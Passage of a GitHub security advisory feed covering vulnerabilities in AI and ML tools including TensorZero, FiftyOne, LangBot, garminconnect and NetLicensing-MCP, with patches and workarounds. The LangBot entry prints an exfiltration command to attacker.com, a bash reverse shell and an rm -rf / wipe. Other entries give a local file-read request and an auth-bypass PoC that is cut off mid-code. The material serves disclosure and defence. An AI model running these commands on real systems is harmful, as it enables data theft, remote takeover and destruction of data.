        <published>2026-07-15T22:00:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorzero] TensorZero Gateway: Arbitrary file read and SSRF in internal object storage endpoint]]></title>
        <id>https://github.com/advisories/GHSA-824w-x939-6cmc</id>
        <link href="https://github.com/advisories/GHSA-824w-x939-6cmc"/>
        <updated>2026-07-15T21:59:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>/internal/object_storage</code> endpoint accepts a caller-supplied JSON <code>storage_path</code> parameter that dynamically overrides the TensorZero <code>[object_storage]</code> configuration.</p>
<p>By abusing the <code>filesystem</code> storage type, a caller can read arbitrary files from the gateway filesystem, including files that may contain sensitive credentials. Similarly, by abusing the <code>s3_compatible</code> storage type, the caller can coerce the gateway into making outbound object storage requests to attacker-chosen internal/cloud-metadata endpoints.</p>
<p>This vulnerability only applies when the gateway can be accessed by untrusted callers. If a developer's TensorZero deployment has authentication enabled, only authenticated callers can exploit this vulnerability. If a developer's deployment has authentication disabled, any caller can exploit this vulnerability.</p>
<h3 id="remediation">Remediation</h3>
<p>The vulnerability has been patched in version <code>2026.6.0</code>. See PR #7527.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If developers are unable to upgrade a gateway that is exposed to untrusted callers, please block external access to the <code>/internal/object_storage</code> endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorzero/tensorzero/security/advisories/GHSA-824w-x939-6cmc">https://github.com/tensorzero/tensorzero/security/advisories/GHSA-824w-x939-6cmc</a></li>
<li><a href="https://github.com/tensorzero/tensorzero/commit/0abbc838bae3394fe7491dad7009670d4e3b6cf8">https://github.com/tensorzero/tensorzero/commit/0abbc838bae3394fe7491dad7009670d4e3b6cf8</a></li>
<li><a href="https://github.com/tensorzero/tensorzero/releases/tag/2026.6.0">https://github.com/tensorzero/tensorzero/releases/tag/2026.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-824w-x939-6cmc">https://github.com/advisories/GHSA-824w-x939-6cmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-824w-x939-6cmc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T21:59:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fiftyone] FiftyOne App server uses wildcard CORS (Access-Control-Allow-Origin: *), enabling cross-origin reads of local server data]]></title>
        <id>https://github.com/advisories/GHSA-q78p-hj9h-5466</id>
        <link href="https://github.com/advisories/GHSA-q78p-hj9h-5466"/>
        <updated>2026-07-15T21:57:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The FiftyOne App/API server (<code>fiftyone/server/app.py</code>) and the <code>/media</code> route (<code>fiftyone/server/routes/media.py</code>) unconditionally set a permissive CORS header (<code>Access-Control-Allow-Origin: *</code>) on their responses. Because the embedded App server runs locally and is unauthenticated, this allows <strong>any website a user visits to make cross-origin requests to that user's running FiftyOne server and read the responses</strong>.</p>
<p>Combined with the unauthenticated <code>/media</code> endpoint — which serves files from the local filesystem by path — the wildcard CORS policy turns a local-only file read into a <strong>remotely exploitable, drive-by data exfiltration</strong> vulnerability. A malicious web page can silently issue requests such as <code>http://localhost:5151/media?filepath=/etc/passwd</code> and read arbitrary files accessible to the server process (SSH keys, cloud credentials, <code>.env</code> files, dataset media, etc.), then exfiltrate them to an attacker-controlled endpoint.</p>
<p>The victim only needs to have a FiftyOne server running locally and visit a malicious page — no clicks or other interaction are required. Browsers that have shipped Private Network Access / local-network-access protections (e.g. Chromium 142+) mitigate this for some users, but Safari and Firefox do not yet, so the attack remains viable in common configurations.</p>
<p><strong>Who is impacted:</strong> any user running FiftyOne (the open-source, embedded App server) locally while also browsing the web.</p>
<p><strong>Not affected:</strong> media stored in cloud buckets, which is served via signed URLs on a separate origin.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>FiftyOne 1.17.0</strong>. The hard-coded <code>Access-Control-Allow-Origin: *</code> has been removed and the server now responds <strong>same-origin only by default</strong>, which covers local desktop usage and the supported notebook integrations (each served through a same-origin proxy or iframe).</p>
<p>Cross-origin access is now opt-in via a new <code>allowed_origins</code> config option (environment variable <code>FIFTYONE_ALLOWED_ORIGINS</code>), an explicit comma-separated list of trusted origins, e.g.:</p>
<pre><code class="language-shell">export FIFTYONE_ALLOWED_ORIGINS='https://app.example.com,http://localhost:3000'
</code></pre>
<p>The literal value <code>*</code> restores the legacy wildcard behavior for users who explicitly require it and emits a warning.</p>
<p><strong>Users should upgrade to FiftyOne 1.17.0 or later.</strong></p>
<h3 id="workarounds">Workarounds</h3>
<p>In affected versions there is no configuration flag to disable the wildcard CORS header without upgrading. Until you can upgrade:</p>
<ul>
<li>Do not run the FiftyOne App server while browsing untrusted websites.</li>
<li>Keep the App server bound to <code>localhost</code> (the default) and avoid exposing it on a network interface.</li>
<li>Use a browser that enforces Private Network Access protections.</li>
</ul>
<h3 id="resources">Resources</h3>
<ul>
<li>OWASP A01:2025 – Broken Access Control: <a href="https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/">https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/voxel51/fiftyone/security/advisories/GHSA-q78p-hj9h-5466">https://github.com/voxel51/fiftyone/security/advisories/GHSA-q78p-hj9h-5466</a></li>
<li><a href="https://github.com/voxel51/fiftyone/commit/7c5b92eec5c7c0210c0c8134351ced77d2800ae0">https://github.com/voxel51/fiftyone/commit/7c5b92eec5c7c0210c0c8134351ced77d2800ae0</a></li>
<li><a href="https://github.com/voxel51/fiftyone/releases/tag/v1.17.0">https://github.com/voxel51/fiftyone/releases/tag/v1.17.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q78p-hj9h-5466">https://github.com/advisories/GHSA-q78p-hj9h-5466</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q78p-hj9h-5466</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-15T21:57:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[streamlit] Streamlit @st.cache_data hash collision via fixed sampling seed and PIL P-mode palette omission]]></title>
        <id>https://github.com/advisories/GHSA-vqwp-45wm-r9r5</id>
        <link href="https://github.com/advisories/GHSA-vqwp-45wm-r9r5"/>
        <updated>2026-07-15T21:49:13.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in Streamlit up to 1.53.0. Impacted is an unknown function in the library lib/streamlit/runtime/caching/hashing.py of the component Palette Handler. Such manipulation leads to use of weak hash. Local access is required to approach this attack. The attack requires a high level of complexity. The exploitability is considered difficult. The exploit has been disclosed to the public and may be used. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10804">https://nvd.nist.gov/vuln/detail/CVE-2026-10804</a></li>
<li><a href="https://github.com/streamlit/streamlit/issues/14622">https://github.com/streamlit/streamlit/issues/14622</a></li>
<li><a href="https://github.com/streamlit/streamlit/pull/14635">https://github.com/streamlit/streamlit/pull/14635</a></li>
<li><a href="https://github.com/streamlit/streamlit">https://github.com/streamlit/streamlit</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10804">https://vuldb.com/cve/CVE-2026-10804</a></li>
<li><a href="https://vuldb.com/submit/831508">https://vuldb.com/submit/831508</a></li>
<li><a href="https://vuldb.com/vuln/368253">https://vuldb.com/vuln/368253</a></li>
<li><a href="https://vuldb.com/vuln/368253/cti">https://vuldb.com/vuln/368253/cti</a></li>
<li><a href="https://github.com/streamlit/streamlit/pull/15397">https://github.com/streamlit/streamlit/pull/15397</a></li>
<li><a href="https://github.com/streamlit/streamlit/commit/fec0f584dae9261abed16cad35b32922104bb933">https://github.com/streamlit/streamlit/commit/fec0f584dae9261abed16cad35b32922104bb933</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/streamlit/PYSEC-2026-212.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/streamlit/PYSEC-2026-212.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vqwp-45wm-r9r5">https://github.com/advisories/GHSA-vqwp-45wm-r9r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqwp-45wm-r9r5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T12:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gptcache] GPTCache: File and image cache keys collide because BufferedReader.peek() only reads the buffered prefix]]></title>
        <id>https://github.com/advisories/GHSA-xfqj-4cr9-9gr5</id>
        <link href="https://github.com/advisories/GHSA-xfqj-4cr9-9gr5"/>
        <updated>2026-07-15T18:55:27.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was detected in zilliztech GPTCache up to 0.1.44. Affected by this issue is the function BufferedReader.peek of the file gptcache/processor/pre.py of the component Cache Key Handler. Performing a manipulation of the argument input_data["image"] results in use of weak hash. The attack must be initiated from a local position. The attack is considered to have high complexity. The exploitation is known to be difficult. The exploit is now public and may be used. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10812">https://nvd.nist.gov/vuln/detail/CVE-2026-10812</a></li>
<li><a href="https://github.com/zilliztech/GPTCache/issues/684">https://github.com/zilliztech/GPTCache/issues/684</a></li>
<li><a href="https://github.com/zilliztech/GPTCache/pull/678">https://github.com/zilliztech/GPTCache/pull/678</a></li>
<li><a href="https://github.com/zilliztech/GPTCache">https://github.com/zilliztech/GPTCache</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10812">https://vuldb.com/cve/CVE-2026-10812</a></li>
<li><a href="https://vuldb.com/submit/831636">https://vuldb.com/submit/831636</a></li>
<li><a href="https://vuldb.com/vuln/368260">https://vuldb.com/vuln/368260</a></li>
<li><a href="https://vuldb.com/vuln/368260/cti">https://vuldb.com/vuln/368260/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-xfqj-4cr9-9gr5">https://github.com/advisories/GHSA-xfqj-4cr9-9gr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfqj-4cr9-9gr5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T15:30:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow: Deterministic sampling in dataset digest enables predictable collisions]]></title>
        <id>https://github.com/advisories/GHSA-5qmp-p3c4-72qj</id>
        <link href="https://github.com/advisories/GHSA-5qmp-p3c4-72qj"/>
        <updated>2026-07-15T17:51:25.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in MLflow up to 3.10.0. This issue affects the function mlflow.data.digest_utils of the file mlflow/data/digest_utils.py of the component Dataset Digest Computation. This manipulation causes use of weak hash. It is possible to launch the attack on the local host. The attack is considered to have high complexity. The exploitability is assessed as difficult. The exploit has been published and may be used. The project was informed of the problem early through a pull request but has not reacted yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10803">https://nvd.nist.gov/vuln/detail/CVE-2026-10803</a></li>
<li><a href="https://github.com/mlflow/mlflow/issues/22419">https://github.com/mlflow/mlflow/issues/22419</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/22420">https://github.com/mlflow/mlflow/pull/22420</a></li>
<li><a href="https://github.com/mlflow/mlflow">https://github.com/mlflow/mlflow</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10803">https://vuldb.com/cve/CVE-2026-10803</a></li>
<li><a href="https://vuldb.com/submit/831462">https://vuldb.com/submit/831462</a></li>
<li><a href="https://vuldb.com/vuln/368252">https://vuldb.com/vuln/368252</a></li>
<li><a href="https://vuldb.com/vuln/368252/cti">https://vuldb.com/vuln/368252/cti</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2026-195.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2026-195.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-5qmp-p3c4-72qj">https://github.com/advisories/GHSA-5qmp-p3c4-72qj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5qmp-p3c4-72qj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T12:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langbot] LangBot: Authenticated RCE Via MCP Configuration]]></title>
        <id>https://github.com/advisories/GHSA-3pvh-63gf-j9mw</id>
        <link href="https://github.com/advisories/GHSA-3pvh-63gf-j9mw"/>
        <updated>2026-07-15T17:39:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Any authenticated user can achieve arbitrary command execution on the LangBot servers through changing the MCP Server Configuration by added an "STDIO" MCP with an arbitrary command.</p>
<h3 id="details">Details</h3>
<p>The repository uses StdioServerParameters which is based on Anthropic's modelcontextprotocol open source, inside the code - src/langbot/pkg/provider/tools/loaders/mcp.py - StdioServerParameters is imported from mcp, which executes a given command which runs a subprocess on the target machine.</p>
<p>Since the LangBot services are authenticated, an attacker finding an open server needs to sign up or login via stolen credentials, then the attacker can use the MCP configuration to enter any arbitrary command, giving the ability to completely take over the machine.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Open the LangBot server</li>
<li>Navigate to Extensions</li>
<li>Open the "MCP" tab and press "Add"</li>
<li>Choose an STDIO server configuration</li>
<li>Add any arbitrary command with arguments<img width="480" height="538" alt="Screenshot 2026-01-19 at 15 08 43" src="https://github.com/user-attachments/assets/c341afa8-68c0-4c34-b5b6-ad8796184bdd"></li>
</ol>
<p>Note that an attacker could use this configuration to enter any arbitrary command, including data exfiltration (cat /etc/passwd | nc attacker.com 4444), opening a reverse shell (bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1), potentially removing the whole machine's data (rm -rf / --no-preserve-root), and many more.</p>
<h3 id="impact">Impact</h3>
<p>This is an authenticated remote code execution vulnerability (RCE), affecting any publicly available LangBot instance, and local instances when in the same network as the attacker (Lateral Movement).
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection').</p>
<h3 id="video-poc">Video POC</h3>
<p><a href="https://github.com/user-attachments/assets/4868d232-7453-442c-bffd-60f0ad4679ea">https://github.com/user-attachments/assets/4868d232-7453-442c-bffd-60f0ad4679ea</a></p>
<h3 id="resources">Resources</h3>
<p><a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/">https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/</a>
<a href="https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/">https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langbot-app/LangBot/security/advisories/GHSA-3pvh-63gf-j9mw">https://github.com/langbot-app/LangBot/security/advisories/GHSA-3pvh-63gf-j9mw</a></li>
<li><a href="https://github.com/advisories/GHSA-3pvh-63gf-j9mw">https://github.com/advisories/GHSA-3pvh-63gf-j9mw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3pvh-63gf-j9mw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T17:39:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[garminconnect] garminconnect Has Insecure Permission Assignment for Garmin OAuth Token Store]]></title>
        <id>https://github.com/advisories/GHSA-wjhr-76vg-2hvc</id>
        <link href="https://github.com/advisories/GHSA-wjhr-76vg-2hvc"/>
        <updated>2026-07-15T17:33:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="insecure-permission-assignment-for-garmin-oauth-token-store">Insecure Permission Assignment for Garmin OAuth Token Store</h2>
<h3 id="summary">Summary</h3>
<p><code>garminconnect</code> (≤ 0.3.4) wrote its OAuth token store to disk without restricting file-system permissions. Under the default Linux umask (<code>022</code>) the token file <code>garmin_tokens.json</code> was created world-readable (<code>0o644</code>). The file contains the DI <strong>refresh token</strong>, so any other local user on a shared host could read it and obtain persistent, unauthorized access to the victim's Garmin Connect account.</p>
<ul>
<li><strong>Severity:</strong> High</li>
<li><strong>Weakness:</strong> CWE-732 (Incorrect Permission Assignment for Critical Resource)</li>
<li><strong>Affected versions:</strong> <code>&lt;= 0.3.4</code></li>
<li><strong>Patched version:</strong> <code>0.3.5</code></li>
</ul>
<h3 id="details">Details</h3>
<p><code>Client.dump()</code> created the token directory and file with no <code>mode</code> argument, leaving permissions entirely to the process umask:</p>
<pre><code class="language-python">def dump(self, path: str) -&gt; None:
    p = Path(path).expanduser()
    if p.is_dir() or not p.name.endswith(".json"):
        p = p / "garmin_tokens.json"
    p.parent.mkdir(parents=True, exist_ok=True)   # no mode=
    p.write_text(self.dumps())                     # no permission restriction
</code></pre>
<p>The serialized payload includes <code>di_token</code>, <code>di_refresh_token</code>, and <code>di_client_id</code>. The call is in the core library (<code>Garmin.login(tokenstore=...)</code> persists tokens this way), and all shipped usage examples default the token store to <code>~/.garminconnect</code>.</p>
<p>Under <code>umask 022</code> the resulting permissions were:</p>
<ul>
<li>token directory → <code>0o755</code></li>
<li><code>garmin_tokens.json</code> → <code>0o644</code> (world-readable)</li>
</ul>
<p>A separate, unprivileged user on the same machine could read the file with a plain <code>open()</code> — no elevated privileges required — and extract the refresh token.</p>
<h3 id="impact">Impact</h3>
<p>Local credential theft / privilege escalation on multi-user Linux or macOS hosts running under a permissive umask. The stolen refresh token can be exchanged for fresh access tokens via Garmin's OAuth endpoint, granting ongoing access to the victim's account (health/fitness data, activity history, device management) until the token is revoked.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>0.3.5</strong> (commit <code>77a3837</code>). <code>dump()</code> now creates the directory as <code>0o700</code> and writes the token file as <code>0o600</code> regardless of umask — using <code>os.open(..., O_CREAT|O_WRONLY|O_TRUNC, 0o600)</code> with <code>O_NOFOLLOW</code> where available, plus a defensive <code>chmod</code> that also tightens a pre-existing loose file:</p>
<pre><code class="language-python">p.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
with contextlib.suppress(OSError):
    p.parent.chmod(0o700)
flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
if hasattr(os, "O_NOFOLLOW"):
    flags |= os.O_NOFOLLOW
fd = os.open(p, flags, 0o600)
with os.fdopen(fd, "w", encoding="utf-8") as f:
    f.write(self.dumps())
with contextlib.suppress(OSError):
    p.chmod(0o600)
</code></pre>
<p>Verified under <code>umask 022</code>: directory <code>0o700</code>, file <code>0o600</code>, no group/other access.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, restrict the token store manually and keep it owner-only:</p>
<pre><code class="language-bash">chmod 700 ~/.garminconnect
chmod 600 ~/.garminconnect/garmin_tokens.json
</code></pre>
<h3 id="remediation">Remediation</h3>
<ol>
<li><strong>Upgrade</strong> to <code>garminconnect &gt;= 0.3.5</code>:<pre><code class="language-bash">pip install --upgrade garminconnect
</code></pre>
</li>
<li><strong>Fix any token file already on disk</strong> — upgrading only tightens permissions
on the <em>next</em> write, so an existing world-readable file stays exposed until
then:<pre><code class="language-bash">chmod 600 ~/.garminconnect/garmin_tokens.json
# or remove it and log in again to mint a fresh token store
</code></pre>
</li>
<li><strong>If the file was exposed on a shared host, treat the refresh token as
compromised.</strong> Re-authenticate (delete the token store and log in again) so
a new token is issued; consider the previously stored token potentially
read by others until rotated.</li>
</ol>
<h3 id="credit">Credit</h3>
<p>Reported by <strong>EQSTLab</strong> via a private security advisory. garminconnect thanks them for the detailed, responsible disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cyberjunky/python-garminconnect/security/advisories/GHSA-wjhr-76vg-2hvc">https://github.com/cyberjunky/python-garminconnect/security/advisories/GHSA-wjhr-76vg-2hvc</a></li>
<li><a href="https://github.com/cyberjunky/python-garminconnect/commit/77a3837f1f79d486663c9646438e70e8319e1a48">https://github.com/cyberjunky/python-garminconnect/commit/77a3837f1f79d486663c9646438e70e8319e1a48</a></li>
<li><a href="https://github.com/cyberjunky/python-garminconnect/commit/f74174a5647e1af78eca1f8f3a0aa5dc5a899947">https://github.com/cyberjunky/python-garminconnect/commit/f74174a5647e1af78eca1f8f3a0aa5dc5a899947</a></li>
<li><a href="https://github.com/cyberjunky/python-garminconnect/releases/tag/0.3.5">https://github.com/cyberjunky/python-garminconnect/releases/tag/0.3.5</a></li>
<li><a href="https://github.com/advisories/GHSA-wjhr-76vg-2hvc">https://github.com/advisories/GHSA-wjhr-76vg-2hvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjhr-76vg-2hvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T17:33:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ms-swift] ms-swift: Image Cache Hash Collision via Missing Dimension Metadata]]></title>
        <id>https://github.com/advisories/GHSA-prfw-69r3-wqxf</id>
        <link href="https://github.com/advisories/GHSA-prfw-69r3-wqxf"/>
        <updated>2026-07-14T20:47:51.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in modelscope ms-swift up to 4.2.0. This affects the function Template._save_pil_image of the file swift/template/base.py of the component PIL Image Cache Key Handler. The manipulation leads to use of weak hash. An attack has to be approached locally. A high degree of complexity is needed for the attack. It is indicated that the exploitability is difficult. The exploit has been disclosed publicly and may be used. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10801">https://nvd.nist.gov/vuln/detail/CVE-2026-10801</a></li>
<li><a href="https://github.com/modelscope/ms-swift/issues/9360">https://github.com/modelscope/ms-swift/issues/9360</a></li>
<li><a href="https://github.com/modelscope/ms-swift/pull/9359">https://github.com/modelscope/ms-swift/pull/9359</a></li>
<li><a href="https://github.com/modelscope/ms-swift">https://github.com/modelscope/ms-swift</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10801">https://vuldb.com/cve/CVE-2026-10801</a></li>
<li><a href="https://vuldb.com/submit/831455">https://vuldb.com/submit/831455</a></li>
<li><a href="https://vuldb.com/submit/831456">https://vuldb.com/submit/831456</a></li>
<li><a href="https://vuldb.com/vuln/368250">https://vuldb.com/vuln/368250</a></li>
<li><a href="https://vuldb.com/vuln/368250/cti">https://vuldb.com/vuln/368250/cti</a></li>
<li><a href="https://github.com/modelscope/ms-swift/commit/27426a6431759a82e2a1c98344b425f90be17e07">https://github.com/modelscope/ms-swift/commit/27426a6431759a82e2a1c98344b425f90be17e07</a></li>
<li><a href="https://github.com/advisories/GHSA-prfw-69r3-wqxf">https://github.com/advisories/GHSA-prfw-69r3-wqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-prfw-69r3-wqxf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T12:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[netlicensing-mcp] NetLicensing-MCP: Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode]]></title>
        <id>https://github.com/advisories/GHSA-x9vc-9ffq-p3gj</id>
        <link href="https://github.com/advisories/GHSA-x9vc-9ffq-p3gj"/>
        <updated>2026-07-14T20:47:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="unauthenticated-use-of-server-side-netlicensing-api-key-in-http-mode">Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode</h2>
<h3 id="summary">Summary</h3>
<p>When <code>netlicensing-mcp</code> is run in HTTP transport mode, the <code>ApiKeyMiddleware</code> fails to enforce authentication: requests that carry no client API key are unconditionally forwarded to the next handler (<code>server.py:1427</code>). The downstream HTTP client then falls back to the server operator's <code>NETLICENSING_API_KEY</code> environment variable (<code>client.py:30</code>) and uses it to authenticate every upstream call to the NetLicensing REST API. An unauthenticated network attacker can therefore invoke any MCP tool — including product listing, license creation/modification, and destructive delete operations — entirely under the operator's identity and account quota. CVSS 3.1 Base Score: <strong>8.1 (High)</strong>.</p>
<h3 id="details">Details</h3>
<p>The HTTP transport is started in <code>src/netlicensing_mcp/server.py</code> around line 1430 via <code>mcp.streamable_http_app()</code>, and <code>ApiKeyMiddleware</code> is registered immediately after (line 1431). The middleware implementation (lines 1412–1427) attempts to extract a per-request API key from either the <code>x-netlicensing-api-key</code> header or the <code>?apikey=</code> query parameter. However, if neither source provides a key, the middleware takes no enforcement action and simply calls <code>return await call_next(request)</code> (line 1427), passing the unauthenticated request downstream.</p>
<p>The downstream client module (<code>src/netlicensing_mcp/client.py</code>) uses a Python <code>ContextVar</code> named <code>api_key_ctx</code> with a default of <code>os.getenv("NETLICENSING_API_KEY", "")</code> (line 30). Because the middleware never sets this context variable for unauthenticated requests, <code>api_key_ctx.get()</code> returns the server-level environment variable. The client then encodes this value into an HTTP Basic Authorization header (<code>lines 62–70</code>) and transmits it to the upstream NetLicensing REST API on every request (<code>lines 105, 109</code>).</p>
<p>The complete exploitable data flow is:</p>
<table>
<thead>
<tr>
<th>Step</th>
<th>Location</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>server.py:1430</code></td>
<td>HTTP app created with <code>mcp.streamable_http_app()</code></td>
</tr>
<tr>
<td>2</td>
<td><code>server.py:1431</code></td>
<td><code>ApiKeyMiddleware</code> registered</td>
</tr>
<tr>
<td>3</td>
<td><code>server.py:1412–1419</code></td>
<td>Middleware attempts (optional) key extraction from headers/query</td>
</tr>
<tr>
<td>4</td>
<td><code>server.py:1427</code></td>
<td><strong>Auth bypass sink</strong>: missing key → <code>return await call_next(request)</code></td>
</tr>
<tr>
<td>5</td>
<td><code>server.py:155–163</code></td>
<td>Unauthenticated caller invokes <code>netlicensing_list_products</code> (or any tool)</td>
</tr>
<tr>
<td>6</td>
<td><code>tools/products.py:9,17</code></td>
<td>Tool delegates to <code>nl_get("/product", ...)</code></td>
</tr>
<tr>
<td>7</td>
<td><code>client.py:30</code></td>
<td><strong>Source</strong>: <code>api_key_ctx</code> defaults to <code>NETLICENSING_API_KEY</code> env var</td>
</tr>
<tr>
<td>8</td>
<td><code>client.py:62–70</code></td>
<td><code>Authorization: Basic base64("apiKey:&lt;key&gt;")</code> constructed</td>
</tr>
<tr>
<td>9</td>
<td><code>client.py:105,109</code></td>
<td><strong>Upstream sink</strong>: <code>client.get(url, headers=_headers(), ...)</code> executed</td>
</tr>
</tbody></table>
<p>Critical code excerpts:</p>
<pre><code class="language-python"># src/netlicensing_mcp/server.py
1418:     if not key:
1419:         key = request.query_params.get("apikey")
1421:     if key:
1422:         token = api_key_ctx.set(key)
            ...
1427:     return await call_next(request)   # &lt;-- no rejection when key is absent
</code></pre>
<pre><code class="language-python"># src/netlicensing_mcp/client.py
30:  "api_key", default=os.getenv("NETLICENSING_API_KEY", "")   # server-side fallback
...
64:  auth_str = f"apiKey:{api_key}"
70:  "Authorization": f"Basic {token}",
...
109: r = await client.get(url, headers=_headers(), params=params or {})
</code></pre>
<p>The README (<code>README.md:90–94</code>) documents the HTTP mode deployment pattern with <code>-e NETLICENSING_API_KEY=your_key</code> as a first-class production deployment option, including AWS App Runner / ELB examples (<code>README.md:310–318</code>). The per-client key recommendation (<code>README.md:318</code>) is advisory only and is not technically enforced.</p>
<p>A suggested patch replaces the unconditional pass-through with a <code>401</code> rejection:</p>
<pre><code class="language-diff">--- a/src/netlicensing_mcp/server.py
+++ b/src/netlicensing_mcp/server.py
@@
          class ApiKeyMiddleware(BaseHTTPMiddleware):
              async def dispatch(self, request: Request, call_next):
+                 if request.url.path == "/health":
+                     return await call_next(request)
+
                  key = request.headers.get("x-netlicensing-api-key")
                  if not key:
                      auth = request.headers.get("authorization")
                      if auth and auth.lower().startswith("bearer "):
                          key = auth[7:]
@@
                          return await call_next(request)
                      finally:
                          api_key_ctx.reset(token)
-                 return await call_next(request)
+                 return JSONResponse(
+                     {"error": "NetLicensing API key is required for HTTP transport"},
+                     status_code=401,
+                 )
</code></pre>
<h3 id="poc">PoC</h3>
<p><strong>Environment requirements:</strong></p>
<ul>
<li>Docker (or Python 3.12 with <code>netlicensing-mcp==0.1.5</code> and <code>mcp</code> client installed)</li>
<li>Target commit: <code>ef0080c2aebbf4dfbce93a959dd7c1471103c05a</code></li>
</ul>
<p><strong>Self-contained Docker reproduction (all-in-one):</strong></p>
<pre><code># Build the image from the repository root
docker build -f vuln-001/Dockerfile -t vuln-001-netlicensing .

# Run the PoC — exits 0 on confirmed exploit
docker run --rm --network=host vuln-001-netlicensing
</code></pre>
<p><strong>Manual step-by-step reproduction:</strong></p>
<pre><code># Terminal 1 — mock upstream NetLicensing REST API
python3 - &lt;&lt;'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("MOCK_REQUEST", self.command, self.path,
